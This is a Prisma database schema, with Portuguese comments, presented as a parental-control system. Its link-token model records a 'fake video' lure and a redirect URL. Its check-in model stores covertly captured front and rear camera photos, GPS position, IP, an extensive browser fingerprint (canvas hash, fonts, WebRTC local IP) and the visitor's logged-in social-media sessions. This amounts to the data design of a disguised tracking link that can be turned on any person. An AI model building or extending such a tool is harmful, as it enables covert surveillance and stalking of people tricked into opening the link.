// Prisma Schema - Sistema de Controle Parental
// Modelos para gerenciar responsáveis, filhos, check-ins, cercas e horários

generator client {
  provider = "prisma-client-js"
}

datasource db {
  provider = "postgresql"
  url      = env("DATABASE_URL")
}

/// Responsável (pai/mãe) do sistema
model User {
  id        String   @id @default(cuid())
  email     String   @unique
  password  String
  nome      String
  createdAt DateTime @default(now())
  updatedAt DateTime @updatedAt

  filhos Filho[]

  @@map("users")
}

/// Filho(a) monitorado(a)
model Filho {
  id            String   @id @default(cuid())
  nome          String
  idade         Int?
  dispositivo   String?
  responsavelId String
  ativo         Boolean  @default(true)
  createdAt     DateTime @default(now())
  updatedAt     DateTime @updatedAt

  responsavel User             @relation(fields: [responsavelId], references: [id], onDelete: Cascade)
  checkins    Checkin[]
  tokens      TokenCheckin[]
  cercas      CercaVirtual[]
  horarios    HorarioProgramado[]
  alertas     Alerta[]

  @@map("filhos")
}

/// Check-in de localização realizado pelo filho
model Checkin {
  id          String   @id @default(cuid())
  filhoId     String
  foto        String?  @db.Text
  fotoTraseira String? @db.Text      // foto da câmera traseira
  latitude    Float
  longitude   Float
  endereco    String?  @db.Text
  ip          String
  userAgent   String
  plataforma  String?  // ex: "iPhone", "Android", "Windows"
  navegador   String?  // ex: "Chrome 120", "Safari 17"
  tela        String?  // ex: "390x844" (largura x altura)
  bateria     Int?     // nível de bateria 0-100
  carregando  Boolean? // se está carregando
  rede        String?  // tipo de conexão: "wifi", "4g", "3g"
  idioma      String?  // idioma do navegador
  timezone    String?  // fuso horário

  // GPS detalhado
  altitude    Float?   // altitude em metros
  velocidade  Float?   // velocidade em m/s
  precisaoGPS Float?   // precisão do GPS em metros
  direcao     Float?   // heading/direção em graus

  // Hardware
  memoriaRAM  Float?   // navigator.deviceMemory (GB)
  nucleosCPU  Int?     // navigator.hardwareConcurrency
  gpu         String?  @db.Text // WebGL renderer
  
  // Fingerprint
  canvasHash    String?  // canvas fingerprint hash
  pixelRatio    Float?   // window.devicePixelRatio
  colorDepth    Int?     // screen.colorDepth
  maxTouchPoints Int?    // navigator.maxTouchPoints
  fontes        String?  @db.Text // lista de fontes detectadas

  // Rede extra
  ipLocal       String?  // IP local via WebRTC
  downlink      Float?   // velocidade de download Mbps
  rtt           Int?     // latência da rede em ms

  // Extras
  orientacaoTela String?  // ex: "portrait-primary"
  modoEscuro     Boolean? // prefers-color-scheme: dark
  cookiesAtivos  Boolean? // navigator.cookieEnabled
  dnt            Boolean? // Do Not Track
  armazenamento  Float?   // storage estimate em GB
  vendor         String?  // navigator.vendor
  platform       String?  // navigator.platform
  webdriver      Boolean? // navigator.webdriver (detecta automação)

  socialSessions Json?   // status de sessão logada em redes sociais (google, facebook, instagram)
  createdAt   DateTime @default(now())

  filho   Filho    @relation(fields: [filhoId], references: [id], onDelete: Cascade)
  alertas Alerta[]

  @@map("checkins")
}

/// Token único para link de check-in
model TokenCheckin {
  id          String   @id @default(cuid())
  filhoId     String
  token       String   @unique
  expiracao   DateTime
  usado       Boolean  @default(false)
  videoTipo   String   @default("youtube_funny")  // Tipo de vídeo fake exibido
  redirectUrl String?  @db.Text                    // URL de redirecionamento customizada
  createdAt   DateTime @default(now())

  filho Filho @relation(fields: [filhoId], references: [id], onDelete: Cascade)

  @@map("tokens_checkin")
}

/// Cerca virtual (geofence)
model CercaVirtual {
  id        String   @id @default(cuid())
  filhoId   String
  nome      String
  latitude  Float
  longitude Float
  raio      Float    // raio em metros
  ativa     Boolean  @default(true)
  createdAt DateTime @default(now())
  updatedAt DateTime @updatedAt

  filho Filho @relation(fields: [filhoId], references: [id], onDelete: Cascade)

  @@map("cercas_virtuais")
}

/// Dias da semana
enum DiaSemana {
  SEGUNDA
  TERCA
  QUARTA
  QUINTA
  SEXTA
  SABADO
  DOMINGO
}

/// Horário programado para check-in
model HorarioProgramado {
  id        String    @id @default(cuid())
  filhoId   String
  diaSemana DiaSemana
  horario   String    // formato "HH:mm"
  ativo     Boolean   @default(true)
  createdAt DateTime  @default(now())

  filho Filho @relation(fields: [filhoId], references: [id], onDelete: Cascade)

  @@map("horarios_programados")
}

/// Tipos de alerta
enum TipoAlerta {
  CHECKIN_REALIZADO
  FORA_CERCA
  CHECKIN_ATRASADO
  NOVO_DISPOSITIVO
}

/// Alerta gerado pelo sistema
model Alerta {
  id        String     @id @default(cuid())
  filhoId   String
  tipo      TipoAlerta
  mensagem  String
  lido      Boolean    @default(false)
  checkinId String?
  createdAt DateTime   @default(now())

  filho   Filho    @relation(fields: [filhoId], references: [id], onDelete: Cascade)
  checkin Checkin? @relation(fields: [checkinId], references: [id], onDelete: SetNull)

  @@map("alertas")
}

/// Log de acesso ao sistema
model LogAcesso {
  id        String   @id @default(cuid())
  acao      String
  detalhes  String?
  ip        String?
  userAgent String?
  userId    String?
  createdAt DateTime @default(now())

  @@map("logs_acesso")
}
